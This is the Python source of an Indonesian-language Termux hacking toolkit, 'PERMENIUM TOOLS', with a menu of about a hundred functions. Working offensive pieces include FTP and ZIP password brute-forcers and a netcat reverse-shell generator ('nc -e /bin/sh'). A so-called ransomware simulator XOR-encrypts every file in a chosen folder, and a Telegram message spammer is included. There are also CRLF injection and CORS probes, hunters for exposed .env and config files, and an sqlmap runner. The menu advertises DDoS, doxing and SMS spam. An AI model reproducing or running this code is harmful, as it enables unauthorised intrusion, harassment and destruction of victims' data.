import os
import requests
import re
import platform
from urllib.parse import urlparse
from datetime import datetime
import base64
import time
import base64
import zipfile
import os, requests, socket, hashlib, base64, re, subprocess
from PIL import Image
from PIL.ExifTags import TAGS
import uuid
import random
import sys
# 45. Mass URL Status Checker
def mass_url_status_checker():
    file = input("File daftar URL: ")
    if not os.path.exists(file): print("[!] File tidak ditemukan."); return
    for u in open(file):
        u = u.strip()
        if u:
            try:
                r = requests.head(u, timeout=5)
                print(f"{u} -> {r.status_code}")
            except Exception as e:
                print(f"[ERROR] {u}: {e}")

# 46. Mass Subnet Scanner
def mass_subnet_scanner():
    subnet = input("Subnet (contoh 192.168.1.): ")
    port = int(input("Port: "))
    for i in range(1,50):
        ip = f"{subnet}{i}"
        s = socket.socket(); s.settimeout(0.5)
        if s.connect_ex((ip, port))==0: print(f"[OPEN] {ip}:{port}")
        s.close()

# 47. Phone Carrier Lookup (sederhana)
def phone_carrier_lookup():
    num = input("Nomor HP: ")
    if num.startswith("62"):
        print("[ID] Operator lokal Indonesia")
    else:
        print("Nomor luar negeri")

# 48. BIN Credit Checker
def bin_credit_checker():
    bin_number = input("BIN (6 digit): ")
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_number}", timeout=5)
        if r.status_code==200:
            d=r.json()
            print("Bank:",d.get("bank",{}).get("name"))
            print("Negara:",d.get("country",{}).get("name"))
            print("Brand:",d.get("scheme"))
            print("Tipe:",d.get("type"))
        else: print("[!] Tidak ditemukan.")
    except Exception as e: print("[!] Error:",e)

# 49. Mass Hash Generator
def mass_hash_generator():
    teks=input("Masukkan teks: ")
    print("MD5:",hashlib.md5(teks.encode()).hexdigest())
    print("SHA1:",hashlib.sha1(teks.encode()).hexdigest())
    print("SHA256:",hashlib.sha256(teks.encode()).hexdigest())

# 50. EXIF Metadata Extractor
def exif_metadata():
    path=input("Path gambar: ")
    if not os.path.exists(path): print("[!] File tidak ada"); return
    img=Image.open(path); exif=img._getexif()
    if not exif: print("[!] Tidak ada EXIF"); return
    for t,v in exif.items(): print(f"{TAGS.get(t,t)}: {v}")

# 51. PDF Metadata Viewer
def pdf_metadata_viewer():
    try:
        from PyPDF2 import PdfReader
    except: print("Install PyPDF2: pip install PyPDF2"); return
    path=input("Path PDF: ")
    if not os.path.exists(path): print("[!] File tidak ada"); return
    r=PdfReader(path)
    for k,v in r.metadata.items(): print(f"{k}: {v}")

# 52. URL Shortener
def url_shortener():
    url=input("Masukkan URL: ")
    try:
        r=requests.post("https://cleanuri.com/api/v1/shorten",data={"url":url})
        print("Short URL:",r.json().get("result_url"))
    except Exception as e: print("[!] Error:",e)

# 53. URL Unshortener
def url_unshortener():
    url=input("Masukkan URL pendek: ")
    try:
        r=requests.head(url,allow_redirects=True,timeout=5)
        print("Hasil akhir:",r.url)
    except Exception as e: print("[!] Error:",e)

# 54. Port Banner Grabber
def port_banner_grabber():
    ip=input("IP: ");port=int(input("Port: "))
    try:
        s=socket.socket();s.settimeout(2);s.connect((ip,port))
        b=s.recv(1024);print("Banner:",b.decode(errors="ignore"));s.close()
    except Exception as e: print("[!] Error:",e)

# 55. Mass Admin Finder
def mass_admin_finder():
    base=input("Masukkan domain: ").rstrip("/")
    pathlist=["admin","administrator","login","wp-admin","dashboard"]
    for p in pathlist:
        url=f"{base}/{p}"
        try:
            r=requests.get(url,timeout=3)
            if r.status_code==200: print("[FOUND]",url)
            else: print(f"[{r.status_code}] {url}")
        except: print("[ERR]",url)

# 56. Email Validator (sederhana)
def email_validator():
    email=input("Masukkan email: ")
    pattern=r'^[\w\.-]+@[\w\.-]+\.\w+$'
    if re.match(pattern,email): print("Email format valid.")
    else: print("Format email salah!")

# 57. DNS Zone Transfer
def dns_zone_transfer():
    domain=input("Domain: ")
    try:
        import dns.query, dns.zone
    except: print("Install dnspython: pip install dnspython"); return
    ns=input("NS server: ")
    try:
        z=dns.zone.from_xfr(dns.query.xfr(ns,domain))
        names=z.nodes.keys()
        for n in names: print(n)
    except Exception as e: print("[!] Gagal:",e)

# 58. CORS Misconfig Scanner (sederhana)
def cors_misconfig_scanner():
    url=input("URL: ")
    try:
        r=requests.get(url,headers={"Origin":"http://evil.com"})
        if "access-control-allow-origin" in r.headers:
            print("CORS Header:",r.headers["access-control-allow-origin"])
        else:
            print("Tidak ada header CORS.")
    except Exception as e: print("[!] Error:",e)

# 59. CRLF Injection Test
def crlf_injection_test():
    url=input("URL: ")
    payload="%0d%0aTest:Injected"
    try:
        r=requests.get(url+payload)
        print("Status:",r.status_code)
    except Exception as e: print("[!] Error:",e)

# 60. Local Network ARP
def local_network_arp():
    print("[60] Menjalankan perintah arp -a")
    os.system("arp -a || ip neigh")
 
# 61. MAC Changer (butuh root)
def mac_changer():
    interface = input("Interface (contoh wlan0): ")
    new_mac = input("MAC baru (contoh 02:1A:2B:3C:4D:5E): ")
    os.system(f"ifconfig {interface} down")
    os.system(f"ifconfig {interface} hw ether {new_mac}")
    os.system(f"ifconfig {interface} up")
    print(f"[OK] MAC {interface} diubah ke {new_mac}")

# 62. Packet Sniffer (butuh root)
def packet_sniffer():
    count = int(input("Berapa paket yang mau di-sniff? "))
    print("[INFO] Sniffing...")
    sniff(count=count, prn=lambda x: print(x.summary()))

# 63. JWT Decoder (header & payload saja)
def jwt_decoder():
    token = input("JWT Token: ")
    try:
        header, payload, sig = token.split('.')
        print("Header:", base64.urlsafe_b64decode(header + "=="))
        print("Payload:", base64.urlsafe_b64decode(payload + "=="))
    except Exception as e:
        print("[!] Error:", e)

# 64. Firebase Scanner (cek domain firebase)
def firebase_scanner():
    domain = input("Domain Firebase (contoh projectid): ")
    url = f"https://{domain}.firebaseio.com/.json"
    try:
        r = requests.get(url, timeout=5)
        if r.status_code == 200:
            print("[VULN?] Bisa diakses:", url)
            print(r.text[:200])
        else:
            print("[OK] Tidak bisa diakses bebas")
    except Exception as e:
        print("[!] Error:", e)

# 65. Github Dorker (sederhana)
def github_dorker():
    dork = input("Keyword Dork: ")
    print(f"[INFO] Coba search di GitHub: https://github.com/search?q={dork}")
    os.system(f"termux-open-url 'https://github.com/search?q={dork}'")

# 66. IG Username Checker (dummy)
def ig_username_checker():
    user = input("Username IG: ")
    url = f"https://www.instagram.com/{user}/"
    r = requests.get(url)
    if r.status_code == 200:
        print("[EXIST] Username terdaftar.")
    else:
        print("[AVAILABLE] Username mungkin belum dipakai.")

# 67. Subdomain Takeover Checker (sederhana)
def subdomain_takeover_checker():
    sub = input("Subdomain: ")
    try:
        r = requests.get(f"http://{sub}", timeout=5)
        if "There is no app configured" in r.text or "NoSuchBucket" in r.text:
            print("[!] Mungkin rentan Subdomain Takeover!")
        else:
            print("[OK] Normal.")
    except Exception as e:
        print("[!] Error:", e)

# 68. TLS Version Checker
def tls_version_checker():
    host = input("Host: "); port = 443
    import ssl
    try:
        ctx = ssl.create_default_context()
        s = ctx.wrap_socket(socket.socket(), server_hostname=host)
        s.connect((host, port))
        print("TLS Version:", s.version())
        s.close()
    except Exception as e:
        print("[!] Error:", e)

# 69. Mass Dir Lister
def mass_dir_lister():
    site = input("Masukkan domain: ").rstrip("/")
    paths = ["admin","login","dashboard","config","images"]
    for p in paths:
        u = f"{site}/{p}/"
        try:
            r = requests.get(u, timeout=3)
            print(f"[{r.status_code}] {u}")
        except: print("[ERR]",u)

# 70. Hidden File Finder
def hidden_file_finder():
    site = input("Masukkan domain: ").rstrip("/")
    common = [".env",".git/config",".htaccess","wp-config.php"]
    for c in common:
        u=f"{site}/{c}"
        try:
            r=requests.get(u,timeout=3)
            if r.status_code==200: print("[FOUND]",u)
        except: pass

# 81. Local File Hunter
def local_file_hunter():
    path = input("Masukkan direktori: ")
    if not os.path.isdir(path):
        print("[!] Direktori tidak ditemukan"); return
    ext = input("Ekstensi yang dicari (contoh .php): ")
    for root, dirs, files in os.walk(path):
        for f in files:
            if f.endswith(ext):
                print(os.path.join(root, f))

# 82. Local Port Scanner
def local_port_scanner():
    host = input("Target host: ")
    ports = [21,22,23,25,53,80,443,8080]
    for p in ports:
        s = socket.socket(); s.settimeout(0.5)
        res = s.connect_ex((host,p))
        if res == 0:
            print(f"[OPEN] {p}")
        s.close()

# 83. Mass Screenshotter (via API)
def mass_screenshotter():
    urls = input("File daftar URL: ")
    if not os.path.exists(urls): print("[!] File tidak ditemukan"); return
    outdir = "screenshots"; os.makedirs(outdir, exist_ok=True)
    for u in open(urls):
        u = u.strip()
        if not u: continue
        print(f"[INFO] Screenshot {u}")
        try:
            img = requests.get(f"https://image.thum.io/get/{u}", timeout=10)
            fname = os.path.join(outdir, u.replace("/","_")+".png")
            with open(fname, "wb") as f: f.write(img.content)
            print(f"[OK] Disimpan ke {fname}")
        except Exception as e:
            print("[ERR]",u,e)

# 84. FTP Bruteforce (sederhana)
def ftp_bruteforce():
    from ftplib import FTP
    host = input("Host FTP: ")
    user = input("Username: ")
    passlist = input("File daftar password: ")
    for pwd in open(passlist):
        pwd = pwd.strip()
        try:
            ftp = FTP(host, timeout=3)
            ftp.login(user, pwd)
            print(f"[OK] Password ditemukan: {pwd}")
            ftp.quit()
            return
        except: print(f"[X] {pwd}")
    print("[!] Tidak ditemukan")

# 85. SSH Bruteforce (dummy, hanya template)
def ssh_bruteforce():
    print("[INFO] SSH bruteforce memerlukan paramiko/pylibssh")
    print("Silakan implementasi sesuai kebutuhanmu.")

# 86. POP3 Bruteforce (dummy)
def pop3_bruteforce():
    print("[INFO] POP3 bruteforce memerlukan modul poplib, konsep sama seperti FTP.")

# 87. SMTP Relay Tester
def smtp_relay_tester():
    import smtplib
    host = input("SMTP host: ")
    try:
        server = smtplib.SMTP(host, 25, timeout=5)
        server.set_debuglevel(1)
        server.quit()
    except Exception as e:
        print("[!] Error:",e)

# 88. Traceroute Tool
def traceroute_tool():
    target = input("Target: ")
    os.system(f"traceroute {target} || tracepath {target}")

# 89. Reverse Shell Generator (display command)
def reverse_shell_generator():
    ip = input("IP Attacker: ")
    port = input("Port: ")
    print("Netcat Reverse Shell:\n")
    print(f"nc -e /bin/sh {ip} {port}")

# 90. File Hash Comparator
def file_hash_comparator():
    f1 = input("File 1: ")
    f2 = input("File 2: ")
    if not os.path.exists(f1) or not os.path.exists(f2):
        print("[!] File tidak ditemukan"); return
    h1 = hashlib.md5(open(f1,'rb').read()).hexdigest()
    h2 = hashlib.md5(open(f2,'rb').read()).hexdigest()
    if h1==h2: print("[OK] Hash cocok")
    else: print("[!] Hash berbeda")

# 91. Mass Email Hunter (dummy scraping)
def mass_email_hunter():
    url = input("URL: ")
    r = requests.get(url)
    emails = re.findall(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", r.text)
    print("Email ditemukan:")
    for e in set(emails): print("-",e)

# 92. Mass Phone Hunter
def mass_phone_hunter():
    url = input("URL: ")
    r = requests.get(url)
    nums = re.findall(r"\+62\d{8,13}", r.text)
    print("Nomor ditemukan:")
    for n in set(nums): print("-",n)

# 93. CVE Info Fetcher
def cve_info_fetcher():
    cve = input("CVE ID (contoh CVE-2023-12345): ")
    r = requests.get(f"https://cveawg.mitre.org/api/cve/{cve}")
    if r.status_code == 200:
        data = r.json()
        print("Description:", data.get('containers',{}).get('cna',{}).get('descriptions',[{}])[0].get('value'))
    else:
        print("[!] CVE tidak ditemukan")

# 94. Cloudflare Bypass (dummy)
def cloudflare_bypass():
    url = input("URL: ")
    print("[INFO] Mencoba akses langsung:")
    r = requests.get(url, headers={"User-Agent":"Mozilla/5.0"})
    print(f"Status: {r.status_code}")

# 95. DNS Brute A/AAAA
def dns_brute_a():
    domain = input("Domain: ")
    subs = ["test","dev","staging","mail","vpn"]
    for s in subs:
        try:
            ip = socket.gethostbyname(f"{s}.{domain}")
            print(f"{s}.{domain} -> {ip}")
        except: pass

# 96. Clipboard Logger (dummy, Termux terbatas)
def clipboard_logger():
    print("[INFO] Fitur ini hanya jalan di desktop.")
    print("Di Termux, gunakan: termux-clipboard-get")

# 97. File Encryptor (XOR sederhana)
def file_encryptor():
    path = input("File: ")
    key = input("Key: ").encode()
    data = open(path,'rb').read()
    out = bytes([b ^ key[i%len(key)] for i,b in enumerate(data)])
    with open(path+".enc",'wb') as f: f.write(out)
    print("[OK] Disimpan:",path+".enc")

# 98. Basic Key Generator
def basic_key_generator():
    import random,string
    length = int(input("Panjang key: "))
    key = ''.join(random.choice(string.ascii_letters+string.digits) for _ in range(length))
    print("Key:",key)

# 99. Ransomware Simulator (EDUKASI!)
def ransomware_simulator():
    path = input("Folder target: ")
    for root, dirs, files in os.walk(path):
        for f in files:
            fp = os.path.join(root,f)
            with open(fp,'rb') as file: data = file.read()
            enc = bytes([b ^ 0xAA for b in data])
            with open(fp+".locked",'wb') as nf: nf.write(enc)
    print("[!] Simulasi selesai. File *.locked dibuat.")

# 100. Big Dir Bruteforce
def big_dir_bruteforce():
    domain = input("Domain: ").rstrip("/")
    wordlist = input("Wordlist path: ")
    if not os.path.exists(wordlist):
        print("[!] Wordlist tidak ditemukan"); return
    for w in open(wordlist):
        w = w.strip()
        if not w: continue
        url = f"{domain}/{w}"
        try:
            r = requests.get(url,timeout=3)
            if r.status_code == 200:
                print("[FOUND]",url)
        except: pass
# 71. Mass Geo IP (butuh daftar IP)
def mass_geo_ip():
    file = input("File daftar IP: ")
    if not os.path.exists(file): print("[!] File tidak ada"); return
    for ip in open(file):
        ip=ip.strip()
        if ip:
            try:
                r=requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,query")
                data=r.json()
                print(f"{data['query']} -> {data['city']}, {data['country']}")
            except: print("[ERR]",ip)

# 72. Honeypot Detector (dummy: cek title)
def honeypot_detector():
    url=input("URL: ")
    try:
        r=requests.get(url,timeout=3)
        if "Honeypot" in r.text or "Spamtrap" in r.text:
            print("[!] Mungkin Honeypot!")
        else:
            print("[OK] Normal")
    except Exception as e: print("[!] Error:",e)

# 73. Phone Formatter
def phone_formatter():
    num=input("Nomor HP: ")
    if num.startswith("0"):
        print("Format internasional: +62"+num[1:])
    elif num.startswith("62"):
        print("Format lokal: 0"+num[2:])
    else:
        print("Format tidak dikenal")

# 74. Tor IP Checker
def tor_ip_checker():
    try:
        session = requests.Session()
        session.proxies = {'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'}
        ip = session.get('http://httpbin.org/ip').text
        print("IP via Tor:", ip)
    except Exception as e:
        print("[!] Pastikan Tor service jalan. Error:", e)

# 75. Exploit Searcher (Google dork)
def exploit_searcher():
    keyword=input("Keyword Exploit: ")
    print(f"Search di Exploit-DB: https://www.exploit-db.com/search?q={keyword}")
    os.system(f"termux-open-url 'https://www.exploit-db.com/search?q={keyword}'")

# 76. Reverse Image Search (buka Google)
def reverse_image_search():
    path=input("Path gambar: ")
    if not os.path.exists(path): print("[!] File tidak ada"); return
    print("[INFO] Upload manual ke Google Images ya.")
    os.system("termux-open-url 'https://images.google.com'")

# 77. Mass WHOIS
def mass_whois():
    try:
        import whois
    except: print("Install python-whois: pip install python-whois"); return
    domain=input("Domain: ")
    w=whois.whois(domain)
    print(w.text)

# 78. Robust SQLmap Runner
def robust_sqlmap_runner():
    target=input("Target URL: ")
    os.system(f"sqlmap -u \"{target}\" --batch --random-agent --crawl=1")

# 79. HTML Form Extractor
def html_form_extractor():
    url=input("URL: ")
    r=requests.get(url)
    forms=re.findall(r'<form.*?>.*?</form>',r.text,re.S)
    for f in forms: print(f)

# 80. JS Link Extractor
def js_link_extractor():
    url=input("URL: ")
    r=requests.get(url)
    links=re.findall(r'src=["\'](.*?\.js)["\']',r.text)
    for l in links: print(l)
    
def reverse_dns():
    ip = input("Masukkan IP: ")
    try:
        host = socket.gethostbyaddr(ip)
        print(f"Domain dari IP {ip}: {host[0]}")
    except:
        print("Tidak ditemukan.")

def dir_bruteforce():
    url = input("Masukkan URL (tanpa / di akhir): ")
    paths = ["admin","login","images","uploads","dashboard"]
    for p in paths:
        full = f"{url}/{p}"
        r = requests.get(full)
        if r.status_code == 200:
            print(f"{G}[FOUND]{W} {full}")
        else:
            print(f"{R}[404]{W} {full}")

def robots_viewer():
    url = input("Masukkan URL (contoh https://site.com): ")
    r = requests.get(url.rstrip("/")+"/robots.txt")
    if r.status_code == 200:
        print(r.text)
    else:
        print("Robots.txt tidak ditemukan.")

def base64_tool():
    pilih = input("1. Encode | 2. Decode > ")
    teks = input("Masukkan teks: ")
    if pilih == "1":
        hasil = base64.b64encode(teks.encode()).decode()
        print(f"Hasil encode: {hasil}")
    else:
        try:
            hasil = base64.b64decode(teks.encode()).decode()
            print(f"Hasil decode: {hasil}")
        except:
            print("Teks tidak valid untuk decode.")

def text_to_hash():
    teks = input("Masukkan teks: ")
    print("MD5:", hashlib.md5(teks.encode()).hexdigest())
    print("SHA1:", hashlib.sha1(teks.encode()).hexdigest())
    print("SHA256:", hashlib.sha256(teks.encode()).hexdigest())

def zip_bruteforce():
    zipname = input("Masukkan nama file ZIP: ")
    wordlist = input("Masukkan wordlist: ")
    try:
        with open(wordlist) as f:
            for line in f:
                pwd = line.strip().encode()
                try:
                    with zipfile.ZipFile(zipname) as zf:
                        zf.extractall(pwd=pwd)
                        print(f"{G}[MATCH]{W} Password: {pwd.decode()}")
                        return
                except:
                    print(f"{R}[FAIL]{W} {pwd.decode()}")
    except:
        print("File wordlist tidak ditemukan.")

def html_downloader():
    url = input("Masukkan URL: ")
    r = requests.get(url)
    fname = "downloaded.html"
    with open(fname,"w",encoding='utf-8') as f:
        f.write(r.text)
    print(f"HTML tersimpan di {fname}")

def screenshot_website():
    url = input("Masukkan URL: ")
    # API gratis thum.io
    api_url = f"https://image.thum.io/get/fullpage/{url}"
    r = requests.get(api_url)
    with open("screenshot.png","wb") as f:
        f.write(r.content)
    print("Screenshot disimpan ke screenshot.png")

def fake_useragent():
    url = input("Masukkan URL: ")
    agents = ["Mozilla/5.0","Googlebot","Bingbot"]
    for ua in agents:
        r = requests.get(url, headers={"User-Agent":ua})
        print(f"{C}[{ua}]{W} Status: {r.status_code}")

# Keylogger tidak saya implementasi di sini untuk keamanan
# tetapi kamu bisa gunakan library pynput untuk keperluan edukasi lokal
# Warna terminal
R = '\033[91m'
G = '\033[92m'
Y = '\033[93m'
B = '\033[94m'
C = '\033[96m'
W = '\033[0m'

# Warna ANSI
R = '\033[31m'  # Merah
G = '\033[32m'  # Hijau
Y = '\033[33m'  # Kuning
B = '\033[34m'  # Biru
M = '\033[35m'  # Magenta
C = '\033[36m'  # Cyan
W = '\033[0m'   # Reset/Putih



def clear_screen():
    os.system('cls' if platform.system() == 'Windows' else 'clear')
import time, sys

# Warna ANSI
R = '\033[31m'
G = '\033[32m'
Y = '\033[33m'
B = '\033[34m'
M = '\033[35m'
C = '\033[36m'
W = '\033[0m'

banner_lines = [
f"{R}██████╗ {G}███████╗{Y}██████╗ {B}███╗   ███╗{M}███████╗{C}██╗   ██╗{W}",
f"{R}██╔══██╗{G}██╔════╝{Y}██╔══██╗{B}████╗ ████║{M}██╔════╝{C}██║   ██║{W}",
f"{R}██████╔╝{G}█████╗  {Y}██████╔╝{B}██╔████╔██║{M}█████╗  {C}██║   ██║{W}",
f"{R}██╔═══╝ {G}██╔══╝  {Y}██╔═══╝ {B}██║╚██╔╝██║{M}██╔══╝  {C}██║   ██║{W}",
f"{R}██║     {G}███████╗{Y}██║     {B}██║ ╚═╝ ██║{M}███████╗{C}╚██████╔╝{W}",
f"{R}╚═╝     {G}╚══════╝{Y}╚═╝     {B}╚═╝     ╚═╝{M}╚══════╝{C} ╚═════╝ {W}",
f"{Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
f"{C}🚀  {R}P{G}E{Y}R{B}M{M}E{C}N{Y}I{G}U{R}M  {B}T{M}O{C}O{Y}L{G}S  {C}🚀",
f"{Y}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
]

# Efek animasi ketik
for line in banner_lines:
    for ch in line:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(0.010)  # atur kecepatan
    print()
    

# Logo contoh
logo = f"""
{M}╔════════════════════════════════════════════════════════════╗
{C}║{Y}  ⚡  {R}X{G}P{Y}L{B}O{M}I{C}T  {Y}T{G}O{R}O{B}L{M}S  {C}H{Y}A{G}C{R}K  ⚡      {C}║
{M}╠════════════════════════════════════════════════════════════╣
{G}║ {R}██╗  ██╗{Y}██████╗ {C}██╗      {M} ██████╗ {B}██╗████████╗   {G}║
{C}║ {Y}██║ ██╔╝{M}██╔══██╗{R}██║      {B}██╔═══██╗{Y}██║╚══██╔══╝   {C}║
{M}║ {G}█████╔╝ {C}██████╔╝{Y}██║      {R}██║   ██║{B}██║   ██║      {M}║
{B}║ {R}██╔═██╗ {Y}██╔═══╝ {G}██║      {C}██║   ██║{M}██║   ██║      {B}║
{Y}║ {C}██║  ██╗{M}██║     {B}███████╗ {R}╚██████╔╝{G}██║   ██║      {Y}║
{M}╚════════════════════════════════════════════════════════════╝{W}
"""

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    clear_screen()
    now = datetime.now()
    tanggal = now.strftime("%d-%m-%Y")
    jam = now.strftime("%H:%M:%S")

    # Cetak logo dengan efek ketik pelan
    for ch in logo:
        sys.stdout.write(ch)
        sys.stdout.flush()
        time.sleep(0.0005)
    print()

    # Garis pembatas warna-warni
    garis = ""
    warna = [R, G, Y, B, M, C]
    for i in range(60):
        garis += random.choice(warna) + "━"
    print(garis + W)

    # Info tanggal & jam
    print(f"{C}📅 Tanggal : {Y}{tanggal}{W}   |   ⏰ Jam : {G}{jam}{W}")

    # Garis pembatas warna-warni kedua
    garis2 = ""
    for i in range(60):
        garis2 += random.choice(warna) + "━"
    print(garis2 + W)

    # Tambahan teks deskripsi
    print(f"{M}🔥 Selamat datang di {C}PERMENIUM TOOLS{M}! 🚀{W}")
    print(f"{C}Nikmati fitur-fitur keren untuk eksplorasi dan produktivitas.{W}\n")

def spam_bot_telegram():
    token = input("Bot Token: ")
    chat_id = input("Chat ID: ")
    text = input("Pesan: ")
    jumlah = int(input("Jumlah: "))
    for i in range(jumlah):
        try:
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={text}")
            if r.status_code == 200:
                print(f"{G}[✓] Terkirim {i+1}{W}")
            else:
                print(f"{R}[!] Gagal kirim {i+1}{W}")
        except:
            print(f"{R}[!] Error koneksi{W}")

def cek_nomor_wa():
    print("\n=== CEK NOMOR WHATSAPP ===")
    nomor = input("Masukkan nomor WA (contoh: 6281234567890): ").strip()

    if not nomor.isdigit():
        print("⚠️ Masukkan hanya angka tanpa spasi atau simbol!")
        return

    try:
        res = requests.post("http://localhost:3000/cek", json={"nomor": nomor})
        data = res.json()

        if data.get("aktif"):
            print(f"✅ Nomor {nomor} TERDAFTAR di WhatsApp")
        else:
            print(f"❌ Nomor {nomor} TIDAK TERDAFTAR di WhatsApp")
    except Exception as e:
        print(f"❌ Gagal menghubungi server: {e}")

def scan_vuln():
    target = input("Target: ")
    print(f"[*] Scanning {target}...")
    try:
        response = requests.get(f"{target}/wp-includes/version.php", timeout=5)
        if response.status_code == 200 and "wp_version" in response.text:
            version = re.search(r"wp_version = '([^']+)'", response.text)
            print(f"[+] WP Version: {version.group(1) if version else 'Unknown'}")

        plugins = ["wp-file-manager", "revslider", "wpshop"]
        for plugin in plugins:
            r = requests.get(f"{target}/wp-content/plugins/{plugin}/readme.txt", timeout=5)
            if r.status_code == 200:
                print(f"[+] Vulnerable Plugin Detected: {plugin}")

        xmlrpc = requests.get(f"{target}/xmlrpc.php", timeout=5)
        if xmlrpc.status_code == 200:
            print("[+] XML-RPC Enabled! Vulnerable to brute force.")

        with open("/sdcard/wp_scan.txt", "a") as f:
            f.write(f"{target}: {response.text[:100]}...\n")
        print("[*] Hasil disimpan di /sdcard/wp_scan.txt")
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")


def cek_ping_vps():
    print(f"\n{B}CEK PING VPS{W}")
    target = input("Masukkan IP/domain VPS: ")

    # Tentukan perintah ping berdasarkan OS
    param = "-n" if platform.system().lower() == "windows" else "-c"
    command = f"ping {param} 4 {target}"

    print(f"\n{C}Melakukan ping ke {target}...{W}\n")
    response = os.system(command)

    if response == 0:
        print(f"{G}[✓] VPS {target} TERHUBUNG (UP){W}")
    else:
        print(f"{R}[✗] VPS {target} TIDAK TERHUBUNG (DOWN){W}")

    input(f"\n{B}Tekan Enter untuk kembali...{W}")

def cek_http_status():
    print(f"\n{B}CEK STATUS HTTP WEBSITE{W}")
    url = input("Masukkan URL website (contoh: https://example.com): ").strip()

    if not url.startswith("http"):
        url = "http://" + url

    try:
        start = time.time()
        response = requests.get(url, timeout=10)
        delay = time.time() - start

        print(f"\n{G}[✓] Website Tersambung!{W}")
        print(f"{C}Status Code : {W}{response.status_code}")
        print(f"{C}Waktu Respon: {W}{delay:.2f} detik")

        # Cek kemungkinan lambat / kena DDoS
        if response.status_code >= 500:
            print(f"{R}⚠️ Server Error. Kemungkinan besar down atau overload.{W}")
        elif delay > 5:
            print(f"{Y}⚠️ Respon sangat lambat (>5s). Bisa jadi sedang diserang atau overload.{W}")
        else:
            print(f"{G}✅ Website normal.{W}")

    except requests.exceptions.RequestException as e:
        print(f"{R}[✗] Gagal mengakses website: {e}{W}")
    
    input(f"\n{B}Tekan Enter untuk kembali...{W}")
# Dummy fitur
def cek_ip(): print("[] Fitur cek IP belum tersedia.")
def crack_ip(): print("[] Fitur crack IP belum tersedia.")
def cek_host(): print("[] Fitur cek host belum tersedia.")
def cek_gempa(): print("[] Fitur cek gempa belum tersedia.")
def cek_cuaca(): print("[] Fitur cek cuaca belum tersedia.")
def scan_sql_injection(): print("[] Fitur SQL injection belum tersedia.")
def cek_https_ssl(): print("[] Fitur HTTPS belum tersedia.")
def bug_bounty_list(): print("[] Bug bounty belum tersedia.")

# Tambahan fungsi reverse_ip
def reverse_ip():
    print(f"{C}=== Reverse IP Lookup ==={W}")
    domain = input("Masukkan domain/IP: ")
    try:
        r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={domain}")
        if "error" in r.text or r.status_code != 200:
            print(f"{R}[!] Gagal menemukan domain terkait atau IP salah.{W}")
        else:
            print(f"{G}[✓] Domain ditemukan:\n{W}{r.text}")
    except Exception as e:
        print(f"{R}[!] Error: {e}{W}")


# Banner contoh
# contoh fungsi akses_vps
# ------------------------- MENU -------------------------
def menu():
    while True:
        # Tampilkan banner (logo sudah ada di banner)
        banner()
        print(f"\n{Y}=== ✨ MENU PERMENIUM TOOLS ✨ ==={W}\n")

        # Fungsi pembantu untuk cetak item menu dengan warna
        def item(no, teks):
            return f"{C}[{str(no).zfill(2)}]{W} {teks}"

        # Daftar menu
        menu_items = [
            ("01", "Spam Bot Telegram"),       ("02", "Spam Email"),
            ("03", "Cek IP"),                  ("04", "Crack IP"),
            ("05", "Cek Host"),                ("06", "Scanner"),
            ("07", "Spam SMS"),                ("08", "SQL Injection Scanner"),
            ("09", "Cek HTTPS"),               ("10", "Bug Bounty List"),
            ("11", "WP Vuln Scanner"),         ("12", "FB Tracker"),
            ("13", "IG Tracker"),              ("14", "Doxing"),
            ("15", "DDoS Tool"),               ("16", "IG Tracking (v2)"),
            ("17", "Cek Nomor WhatsApp"),      ("18", "Laporkan WA"),
            ("19", "Cek Ping VPS"),            ("20", "HunterNomor"),
            ("21", "Spam Email (Alt)"),        ("22", "Banner Text"),
            ("23", "Dorking Tool"),            ("24", "Hammer DDoS v1"),
            ("25", "Encode JS"),               ("26", "Report V2"),
            ("27", "Brute WP"),                ("28", "Admin Finder"),
            ("29", "Spam SMS (Seeker)"),       ("30", "OSINT Nomor"),
            ("31", "Tools Hacker (10 Fitur)"), ("32", "Decode Tools"),
            ("33", "Reverse IP Lookup"),       ("34", "Cek WAF Protection"),
            ("35", "Reverse DNS Lookup"),      ("36", "HTTP Directory Bruteforce"),
            ("37", "Robots.txt Viewer"),       ("38", "Base64 Encoder/Decoder"),
            ("39", "Text to Hash Generator"),  ("40", "Zip File Password Bruteforce"),
            ("41", "HTML Source Downloader"),  ("42", "Screenshot Website (via API)"),
            ("43", "Fake User-Agent Scanner"), ("44", "Keylogger (edukasi lokal)"),
            ("45", "Mass URL Status Checker"), ("46", "Mass Subnet Scanner"),
            ("47", "Phone Carrier Lookup"),    ("48", "BIN Credit Checker"),
            ("49", "Mass Hash Generator"),     ("50", "EXIF Metadata Extractor"),
            ("51", "PDF Metadata Viewer"),     ("52", "URL Shortener"),
            ("53", "URL Unshortener"),         ("54", "Port Banner Grabber"),
            ("55", "Mass Admin Finder"),       ("56", "Email Validator"),
            ("57", "DNS Zone Transfer"),       ("58", "CORS Misconfig Scanner"),
            ("59", "CRLF Injection Test"),     ("60", "Local Network ARP"),
            ("61", "MAC Changer"),             ("62", "Packet Sniffer"),
            ("63", "JWT Decoder"),             ("64", "Firebase Scanner"),
            ("65", "Github Dorker"),           ("66", "IG Username Checker"),
            ("67", "Subdomain Takeover"),      ("68", "TLS Version Checker"),
            ("69", "Mass Dir Lister"),         ("70", "Hidden File Finder"),
            ("71", "Mass Geo IP"),             ("72", "Honeypot Detector"),
            ("73", "Phone Formatter"),         ("74", "Tor IP Checker"),
            ("75", "Exploit Searcher"),        ("76", "Reverse Image Search"),
            ("77", "Mass WHOIS"),              ("78", "Robust SQLmap Runner"),
            ("79", "HTML Form Extractor"),     ("80", "JS Link Extractor"),
            ("81", "Local File Hunter"),       ("82", "Local Port Scanner"),
            ("83", "Mass Screenshotter"),      ("84", "FTP Bruteforce"),
            ("85", "SSH Bruteforce"),          ("86", "POP3 Bruteforce"),
